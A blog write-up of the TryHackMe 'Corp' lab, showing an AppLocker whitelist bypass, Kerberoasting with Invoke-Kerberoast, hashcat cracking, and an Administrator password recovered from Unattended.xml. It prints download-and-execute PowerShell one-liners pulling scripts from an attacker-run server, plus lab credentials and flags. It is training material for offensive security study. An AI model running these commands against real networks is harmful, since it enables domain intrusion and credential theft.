---
layout: page
title: Corp
description: Whitelist app bypass.
img: 
importance: 4
category: TryHackMe
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/corp/logo.png" title="THM Corp Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/corp">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
So, this one is more of a walkthrough with THM, but still wanted to post it.

Boot up the machine for the room.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/corp/starting.png" title="Default Machine" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Copy nc.exe into the local working folder.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/corp]
└─$ cp $(locate nc.exe) .                                                               
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/corp]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/corp]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Use PowerShell to transfer nc.exe to the victim machine.

{% raw %}
```powershell
PS C:\Users\dark\Desktop> wget http://10.4.119.29:8000/nc.exe -outfile C:\Users\dark\Desktop\nc.exe
```
{% endraw %}

<br />
AppLocker should block the execution.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/corp/appblock.png" title="AppLocker Block" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
There are certain paths that are white-listed by default.  Move the binary to one of these locations.

{% raw %}
```powershell
PS C:\Users\dark\Desktop> cp .\nc.exe C:\Windows\System32\spool\drivers\color\nc.exe
```
{% endraw %}

<br />
The binary should be able to execute now.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/corp/ncexe.png" title="Execution" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Due to difficulties open start, navigate directly to the PowerShell or CMD binary.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/corp/psbin.png" title="PowerShell Binary" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```bash
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```
{% endraw %}
{% raw %}
```bash
C:\Windows\System32\cmd.exe
```
{% endraw %}

<br />
Make sure to check the PowerShell history for the first flag.

{% raw %}
```powershell
PS C:\Windows\System32\WindowsPowerShell\v1.0> cd C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
PS C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> ls


    Directory: C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/1/2025  12:51 PM            327 ConsoleHost_history.txt


PS C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> cat .\ConsoleHost_history.txt
ls
dir
Get-Content test
flag{a12a41b5f8111327690f836e9b302f0b}
iex(new-object net.webclient).DownloadString('http://127.0.0.1/test.ps1')
cls
exit
cd  %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
echo %userprofile%
cd C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
ls
cat .\ConsoleHost_history.txt
PS C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline>
```
{% endraw %}

<br />
Enumerate the usernames in the Service Principal Name (SPN).

{% raw %}
```powershell
PS C:\Users\dark\Desktop> setspn -T medin -Q */*
Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "medin" : 0x00000051
Warning: No valid targets specified, reverting to current domain.
CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
        ldap/omega.corp.local/ForestDnsZones.corp.local
        ldap/omega.corp.local/DomainDnsZones.corp.local
        TERMSRV/OMEGA
        TERMSRV/omega.corp.local
        DNS/omega.corp.local
        GC/omega.corp.local/corp.local
        RestrictedKrbHost/omega.corp.local
        RestrictedKrbHost/OMEGA
        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        HOST/OMEGA/CORP
        HOST/omega.corp.local/CORP
        HOST/OMEGA
        HOST/omega.corp.local
        HOST/omega.corp.local/corp.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
        ldap/OMEGA/CORP
        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        ldap/omega.corp.local/CORP
        ldap/OMEGA
        ldap/omega.corp.local
        ldap/omega.corp.local/corp.local
CN=krbtgt,CN=Users,DC=corp,DC=local
        kadmin/changepw
CN=fela,CN=Users,DC=corp,DC=local
        HTTP/fela
        HOST/fela@corp.local
        HTTP/fela@corp.local

Existing SPN found!
```
{% endraw %}

<br />
Download the kerberoasting PowerShell script.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/corp]
└─$ wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 --inet4-only
--2025-03-02 00:26:31--  https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46848 (46K) [text/plain]
Saving to: ‘Invoke-Kerberoast.ps1’

Invoke-Kerberoast.ps1                                      100%[========================================================================================================================================>]  45.75K  --.-KB/s    in 0.02s   

2025-03-02 00:26:32 (2.85 MB/s) - ‘Invoke-Kerberoast.ps1’ saved [46848/46848]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/corp]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Run the Kerberoasting script on the victim machine.

{% raw %}
```bash
C:\Windows\System32\spool\drivers\color>powershell -ep bypass;
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\System32\spool\drivers\color> iex(New-Object Net.WebClient).DownloadString("http://10.4.119.29:8000/Invoke-Kerberoast.ps1")
PS C:\Windows\System32\spool\drivers\color> Invoke-Kerberoast -OutputFormat hashcat | fl


TicketByteHexStream  :
Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$08085EC8F5E1E0A8BF7B15EED00ABDA7$9B81BBE52C33A771966069A
                       2D53539B9B08357539EEA773FEB83D88F6817ED90D5D79E0856260CC9DCB81A052BDE493A93D8A54D5BB808D0F7702B4
                       3793F6D00FC585D4AD986203011EFC3A1D1891B263A0DB1822A33EC859059CDFBAB7D6CB0CD84FDC669FC09A7F156865
                       0499889E99C96571E68C31758355EB5576830331BD6F8904895C3A99ECC1EFBCB4F8E56D3D2E4B2C92E3CE809686962D
                       4099BCB30343835E37DB9E365684DFE36AFF6DE30BF7D1A5460C1FCD0BADCCA3A1E65DF154C0180B6C5C6B5D87250165
                       CC3FE53BB93F039D47AA2EED6B040966BB8D164D4F6C13C346AD3644F79BB4DFE05B82472C40FD4308DFD55BD72F13BE
                       365A8AFF75AB2DA7D3E9AD19BC4AB05FBF2DAEE2E4F25720A02AD20D9B49CC39C647AF52C7A0605ADCB02C80A7B3DF3B
                       43753F386D9A93CC3B461441BCEC6D8B46E400856991804186921F9266DA396540B0747B8511C3A623A5706FE6D31C5D
                       F2EC043DB7D6540A5519C11C1CBD7103C9F5482C1C3342DB0A5B49AE5D388D93BA9411CC2D37360BBFA91CE7D8CFB768
                       FC609D7F7252D5428CFCF6A5C54B9D3267D910C8E5FC1DDD7C9A1E2E61DB42915F09678F1BF4B167A8E93F561DC50B47
                       799F86DA710AE326B0ADEB9D50C66DB1D5A630527B01219908B5C2F4AF55AE613735486F37A9F2D93028889D2DCEC228
                       A3007227EE8D8FE04B0D8B538C44B74B4F746AA1CF7FDF85CAB81ECA0C8BEB76D1D5D4A939E4B6CC2EDA4E9DAEDBAC3C
                       58F32431E34648A8DC5A0C8007FE348A1CC828994328794084AE9A047FDECC189858CBD3160C7D0210DF86862FADC63F
                       41156E693352821C5C9CD0A35EF143239ABD6AE22D549066C01B0CABEDEDD29A997190587C5D87E562D4CB0385DD338C
                       DEA7B51AA87D6FE066565861FAF5BCE37D5CCC60546B0D07C15EC58E26EE113372A18DFFAC3FC45D7AFD8DC467248C07
                       5E3398217B8BDB1EE592D8D2D4F7D09711D7F0235B9CEB121862604625428C05B31CD30469F97BE398B5732CCFD608BC
                       5415E2191ABE37E4665AD526E574E808767843AB7072FE01FF32CA97B547250A09F03B9B2AC78CCFA38B58F5A4DF2204
                       3CB49F595D4C11185029237DEADBC8D234DF49A7F0883F56ADF7DB7D4375D580AC01B130B72A293CED47549B8D38C103
                       5779DBFE7E185927CD2D1FAFD7D886DB73F9FB10C97D599E60CE3B294AD38E8AE7108FBD44F96551DA2C369DFB26730D
                       22E2AE96AA697BEB6096D3F9E0B706ED39005811846B332568CB7715FD6FB6C3C56DEB3C42A8AAABEC135752D9082261
                       07607CC9DAAA3969A992DDC2D5981B713D92E5DAC98C8C634D066A938910AD0D3AB03CD59CABE8DFA52CE9D2B5CE1144
                       3E3B2C183075611BACD9D0AA3B3C0FE9AE82B6DFFAC
SamAccountName       : fela
DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
ServicePrincipalName : HTTP/fela
```
{% endraw %}

<br />
Save the hash to a sile so we can feed it into a hacker.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/corp]
└─$ cat hash.txt                
$krb5tgs$23$*fela$corp.local$HTTP/fela*$08085EC8F5E1E0A8BF7B15EED00ABDA7$9B81BBE52C33A771966069A2D53539B9B08357539EEA773FEB83D88F6817ED90D5D79E0856260CC9DCB81A052BDE493A93D8A54D5BB808D0F7702B43793F6D00FC585D4AD986203011EFC3A1D1891B263A0DB1822A33EC859059CDFBAB7D6CB0CD84FDC669FC09A7F1568650499889E99C96571E68C31758355EB5576830331BD6F8904895C3A99ECC1EFBCB4F8E56D3D2E4B2C92E3CE809686962D4099BCB30343835E37DB9E365684DFE36AFF6DE30BF7D1A5460C1FCD0BADCCA3A1E65DF154C0180B6C5C6B5D87250165CC3FE53BB93F039D47AA2EED6B040966BB8D164D4F6C13C346AD3644F79BB4DFE05B82472C40FD4308DFD55BD72F13BE365A8AFF75AB2DA7D3E9AD19BC4AB05FBF2DAEE2E4F25720A02AD20D9B49CC39C647AF52C7A0605ADCB02C80A7B3DF3B43753F386D9A93CC3B461441BCEC6D8B46E400856991804186921F9266DA396540B0747B8511C3A623A5706FE6D31C5DF2EC043DB7D6540A5519C11C1CBD7103C9F5482C1C3342DB0A5B49AE5D388D93BA9411CC2D37360BBFA91CE7D8CFB768FC609D7F7252D5428CFCF6A5C54B9D3267D910C8E5FC1DDD7C9A1E2E61DB42915F09678F1BF4B167A8E93F561DC50B47799F86DA710AE326B0ADEB9D50C66DB1D5A630527B01219908B5C2F4AF55AE613735486F37A9F2D93028889D2DCEC228A3007227EE8D8FE04B0D8B538C44B74B4F746AA1CF7FDF85CAB81ECA0C8BEB76D1D5D4A939E4B6CC2EDA4E9DAEDBAC3C58F32431E34648A8DC5A0C8007FE348A1CC828994328794084AE9A047FDECC189858CBD3160C7D0210DF86862FADC63F41156E693352821C5C9CD0A35EF143239ABD6AE22D549066C01B0CABEDEDD29A997190587C5D87E562D4CB0385DD338CDEA7B51AA87D6FE066565861FAF5BCE37D5CCC60546B0D07C15EC58E26EE113372A18DFFAC3FC45D7AFD8DC467248C075E3398217B8BDB1EE592D8D2D4F7D09711D7F0235B9CEB121862604625428C05B31CD30469F97BE398B5732CCFD608BC5415E2191ABE37E4665AD526E574E808767843AB7072FE01FF32CA97B547250A09F03B9B2AC78CCFA38B58F5A4DF22043CB49F595D4C11185029237DEADBC8D234DF49A7F0883F56ADF7DB7D4375D580AC01B130B72A293CED47549B8D38C1035779DBFE7E185927CD2D1FAFD7D886DB73F9FB10C97D599E60CE3B294AD38E8AE7108FBD44F96551DA2C369DFB26730D22E2AE96AA697BEB6096D3F9E0B706ED39005811846B332568CB7715FD6FB6C3C56DEB3C42A8AAABEC135752D908226107607CC9DAAA3969A992DDC2D5981B713D92E5DAC98C8C634D066A938910AD0D3AB03CD59CABE8DFA52CE9D2B5CE11443E3B2C183075611BACD9D0AA3B3C0FE9AE82B6DFFAC
```
{% endraw %}

<br />
Use hashcat to crack the hash.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/corp]
└─$ hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force --quiet     
$krb5tgs$23$*fela$corp.local$HTTP/fela*$08085ec8f5e1e0a8bf7b15eed00abda7$9b81bbe52c33a771966069a2d53539b9b08357539eea773feb83d88f6817ed90d5d79e0856260cc9dcb81a052bde493a93d8a54d5bb808d0f7702b43793f6d00fc585d4ad986203011efc3a1d1891b263a0db1822a33ec859059cdfbab7d6cb0cd84fdc669fc09a7f1568650499889e99c96571e68c31758355eb5576830331bd6f8904895c3a99ecc1efbcb4f8e56d3d2e4b2c92e3ce809686962d4099bcb30343835e37db9e365684dfe36aff6de30bf7d1a5460c1fcd0badcca3a1e65df154c0180b6c5c6b5d87250165cc3fe53bb93f039d47aa2eed6b040966bb8d164d4f6c13c346ad3644f79bb4dfe05b82472c40fd4308dfd55bd72f13be365a8aff75ab2da7d3e9ad19bc4ab05fbf2daee2e4f25720a02ad20d9b49cc39c647af52c7a0605adcb02c80a7b3df3b43753f386d9a93cc3b461441bcec6d8b46e400856991804186921f9266da396540b0747b8511c3a623a5706fe6d31c5df2ec043db7d6540a5519c11c1cbd7103c9f5482c1c3342db0a5b49ae5d388d93ba9411cc2d37360bbfa91ce7d8cfb768fc609d7f7252d5428cfcf6a5c54b9d3267d910c8e5fc1ddd7c9a1e2e61db42915f09678f1bf4b167a8e93f561dc50b47799f86da710ae326b0adeb9d50c66db1d5a630527b01219908b5c2f4af55ae613735486f37a9f2d93028889d2dcec228a3007227ee8d8fe04b0d8b538c44b74b4f746aa1cf7fdf85cab81eca0c8beb76d1d5d4a939e4b6cc2eda4e9daedbac3c58f32431e34648a8dc5a0c8007fe348a1cc828994328794084ae9a047fdecc189858cbd3160c7d0210df86862fadc63f41156e693352821c5c9cd0a35ef143239abd6ae22d549066c01b0cabededd29a997190587c5d87e562d4cb0385dd338cdea7b51aa87d6fe066565861faf5bce37d5ccc60546b0d07c15ec58e26ee113372a18dffac3fc45d7afd8dc467248c075e3398217b8bdb1ee592d8d2d4f7d09711d7f0235b9ceb121862604625428c05b31cd30469f97be398b5732ccfd608bc5415e2191abe37e4665ad526e574e808767843ab7072fe01ff32ca97b547250a09f03b9b2ac78ccfa38b58f5a4df22043cb49f595d4c11185029237deadbc8d234df49a7f0883f56adf7db7d4375d580ac01b130b72a293ced47549b8d38c1035779dbfe7e185927cd2d1fafd7d886db73f9fb10c97d599e60ce3b294ad38e8ae7108fbd44f96551da2c369dfb26730d22e2ae96aa697beb6096d3f9e0b706ed39005811846b332568cb7715fd6fb6c3c56deb3c42a8aaabec135752d908226107607cc9daaa3969a992ddc2d5981b713d92e5dac98c8c634d066a938910ad0d3ab03cd59cabe8dfa52ce9d2b5ce11443e3b2c183075611bacd9d0aa3b3c0fe9ae82b6dffac:rubenF124
```
{% endraw %}

<br />
RDP into the machine as the new user that we now have creds for.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/corp]
└─$ xfreerdp /u:fela /p:rubenF124 /v:10.10.236.143 /dynamic-resolution +clipboard
[00:51:17:259] [37053:37054] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:51:17:259] [37053:37054] [WARN][com.freerdp.crypto] - CN = omega.corp.local
[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.236.143:3389) 
[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] -      omega.corp.local
[00:51:17:261] [37053:37054] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.236.143:3389 (RDP-Server):
        Common Name: omega.corp.local
        Subject:     CN = omega.corp.local
        Issuer:      CN = omega.corp.local
        Thumbprint:  ff:e5:5c:61:fc:8e:9b:be:1d:84:53:ad:7f:58:63:14:cb:23:03:e1:18:84:22:fc:d0:70:46:c5:22:e0:d9:8c
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[00:51:24:811] [37053:37054] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[00:51:24:811] [37053:37054] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[00:51:24:845] [37053:37054] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[00:51:24:845] [37053:37054] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[00:51:24:845] [37053:37054] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[00:51:25:131] [37053:37054] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_WARNING [LOGON_MSG_SESSION_CONTINUE]
```
{% endraw %}

<br />
Get the first flag.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/corp/flag1.png" title="First Flag" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Download the PowerUp.ps1 PowerShell script.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/corp]
└─$ wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1 --inet4-only
--2025-03-02 00:55:17--  https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 494860 (483K) [text/plain]
Saving to: ‘PowerUp.ps1’

PowerUp.ps1                                                100%[========================================================================================================================================>] 483.26K  --.-KB/s    in 0.1s    

2025-03-02 00:55:18 (3.26 MB/s) - ‘PowerUp.ps1’ saved [494860/494860]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/corp]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Run all of the checks from the PowerUp script.

{% raw %}
```powershell
PS C:\Windows\system32> iex(New-Object Net.WebClient).DownloadString("http://10.4.119.29:8000/PowerUp.ps1")
PS C:\Windows\system32> Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.


[*] Checking for unquoted service paths...


[*] Checking service executable and argument permissions...


[*] Checking service permissions...


[*] Checking %PATH% for potentially hijackable .dll locations...


HijackablePath : C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'
                 -Command '...'





[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


[*] Checking for vulnerable registry autoruns and configs...


[*] Checking for vulnerable schtask files/configs...


[*] Checking for unattended install files...


UnattendPath : C:\Windows\Panther\Unattend\Unattended.xml





[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...
```
{% endraw %}

<br />
Check the unattended.xml file looking for encoded passwords.

{% raw %}
```xml
PS C:\Windows\system32> type C:\Windows\Panther\Unattend\Unattended.xml
<AutoLogon>
    <Password>
        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>
```
{% endraw %}

<br />
Decode the password from the unattended.xml file.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/corp]
└─$ echo 'dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=' | base64 -d
tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
```
{% endraw %}

<br />
RDP into the machine as the Administrator with the password from the unattended.xml file.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/corp]
└─$ xfreerdp /u:Administrator /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' /v:10.10.236.143 /dynamic-resolution +clipboard
[01:06:03:773] [44268:44269] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[01:06:03:773] [44268:44269] [WARN][com.freerdp.crypto] - CN = omega.corp.local
[01:06:07:163] [44268:44269] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[01:06:07:163] [44268:44269] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[01:06:07:193] [44268:44269] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[01:06:07:193] [44268:44269] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[01:06:07:193] [44268:44269] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```
{% endraw %}

<br />
I was prompted to change the password.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/corp/expired.png" title="Expired Password" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Change the password, if you are prompted.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/corp/change.png" title="Change Password" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Get the Administrator flag/

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/corp/flag2.png" title="Administrator Flag" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Another one done and dusted.  Hopefully, you enjoyed.  See you in the next one.